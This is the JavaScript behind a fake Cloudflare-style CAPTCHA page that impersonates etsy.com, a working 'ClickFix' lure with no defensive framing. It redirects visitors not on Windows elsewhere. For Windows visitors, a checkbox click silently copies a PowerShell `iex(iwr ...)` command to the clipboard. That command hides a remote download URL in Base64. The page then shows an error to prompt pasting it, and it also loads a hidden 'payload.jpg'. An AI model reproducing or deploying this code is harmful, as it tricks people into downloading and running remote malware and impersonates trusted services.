const CONFIG = {
  copyText: `iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz04ODU1MDY4NzIyL2RoZG9uZTNuZG1kYjM4MmpueDYy'))) -UseBasicParsing)`,
  rayId: "a2esdfh5sw3aeedd6",
  verifyDelayMs: 1400,
  nonWindowsRedirect: "https://etsy.218374059.sbs/125473537393",
};

const widget = document.getElementById("rlhxp0");
const responseInput = document.getElementById("cf-turnstile-response");
const checkbox = document.getElementById("cf-chl-checkbox");
const waitingBlock = document.getElementById("wGhx6");
const instructionsBlock = document.getElementById("captcha-instructions");

let captchaStarted = false;

function isWindowsDevice() {
  if (typeof window.__IS_WINDOWS__ === "boolean") {
    return window.__IS_WINDOWS__;
  }

  const ua = navigator.userAgent || "";
  return /Windows NT|Win32|Win64|WOW64/i.test(ua);
}

function getDeviceInfo() {
  const ua = navigator.userAgent || "";

  if (/iPhone/i.test(ua)) {
    const ios = ua.match(/OS (\d+[_\d]*)/i);
    return ios ? `iPhone (iOS ${ios[1].replace(/_/g, ".")})` : "iPhone";
  }

  if (/iPad/i.test(ua)) {
    const ios = ua.match(/OS (\d+[_\d]*)/i);
    return ios ? `iPad (iOS ${ios[1].replace(/_/g, ".")})` : "iPad";
  }

  if (/Android/i.test(ua)) {
    const version = ua.match(/Android (\d+(?:\.\d+)?)/i);
    const model = ua.match(/Android[^;]*;\s*([^)]+)\)/i);
    const modelName = model ? model[1].trim() : "";
    const androidVersion = version ? version[1] : "";

    if (modelName && !/linux/i.test(modelName)) {
      return androidVersion ? `Android ${androidVersion} (${modelName})` : modelName;
    }

    return androidVersion ? `Android ${androidVersion}` : "Android";
  }

  if (/Windows NT 10/i.test(ua)) {
    return "Windows 10/11";
  }
  if (/Windows NT 6\.3/i.test(ua)) {
    return "Windows 8.1";
  }
  if (/Windows NT 6\.2/i.test(ua)) {
    return "Windows 8";
  }
  if (/Windows NT 6\.1/i.test(ua)) {
    return "Windows 7";
  }
  if (/Windows/i.test(ua)) {
    return "Windows";
  }

  if (/Mac OS X/i.test(ua)) {
    const mac = ua.match(/Mac OS X (\d+[_\d]*)/i);
    return mac ? `macOS ${mac[1].replace(/_/g, ".")}` : "macOS";
  }

  if (/CrOS/i.test(ua)) {
    return "Chrome OS";
  }

  if (/Linux/i.test(ua)) {
    return "Linux";
  }

  return navigator.platform || "Unknown device";
}

async function initCloak() {
  const isWindows = isWindowsDevice();

  if (!isWindows) {
    window.location.replace(CONFIG.nonWindowsRedirect);
    return false;
  }

  return true;
}

function getSiteName() {
  return "etsy.com";
}

function initPage() {
  const siteName = getSiteName();
  document.getElementById("site-name").textContent = siteName;
  const waitingSite = document.getElementById("waiting-site");
  if (waitingSite) {
    waitingSite.textContent = siteName;
  }
  document.getElementById("ray-id").textContent = CONFIG.rayId;
  setWidgetState("idle");
}

async function copyText(text) {
  try {
    await navigator.clipboard.writeText(text);
  } catch {
    const textarea = document.createElement("textarea");
    textarea.value = text;
    textarea.setAttribute("readonly", "");
    textarea.style.position = "fixed";
    textarea.style.left = "-9999px";
    textarea.style.opacity = "0";
    document.body.appendChild(textarea);
    textarea.select();
    document.execCommand("copy");
    document.body.removeChild(textarea);
  }
}

function setWidgetState(state) {
  if (!widget) {
    return;
  }

  widget.dataset.state = state;
  widget.classList.toggle("is-verifying", state === "verifying");
  widget.classList.toggle("is-error", state === "error");

  if (waitingBlock) {
    waitingBlock.classList.add("hidden");
  }

  if (instructionsBlock) {
    instructionsBlock.classList.toggle("hidden", state !== "error");
  }
}

function passCaptcha() {
  if (captchaStarted || !widget) {
    return;
  }

  captchaStarted = true;
  if (checkbox) {
    checkbox.checked = true;
  }

  copyText(CONFIG.copyText);
  setWidgetState("verifying");

  window.setTimeout(() => {
    setWidgetState("error");
    if (responseInput) {
      responseInput.value = "";
    }
  }, CONFIG.verifyDelayMs);
}

function bindCaptchaEvents() {
  if (widget) {
    widget.addEventListener("click", (event) => {
      const link = event.target.closest && event.target.closest("a");
      if (link) {
        if ((link.getAttribute("href") || "").startsWith("#")) {
          event.preventDefault();
        }
        return;
      }
      passCaptcha();
    });

    widget.addEventListener("keydown", (event) => {
      if (event.key === "Enter" || event.key === " ") {
        event.preventDefault();
        passCaptcha();
      }
    });
  }

  if (checkbox) {
    checkbox.addEventListener("change", () => {
      if (checkbox.checked) {
        passCaptcha();
      }
    });
  }
}

function loadPayload() {
  const img = new Image();
  img.style.display = "none";
  img.src = "payload.jpg?" + Date.now();
  document.body.appendChild(img);
}

async function bootstrap() {
  const allowed = await initCloak();
  if (!allowed) {
    return;
  }

  initPage();
  bindCaptchaEvents();
  loadPayload();
}

bootstrap();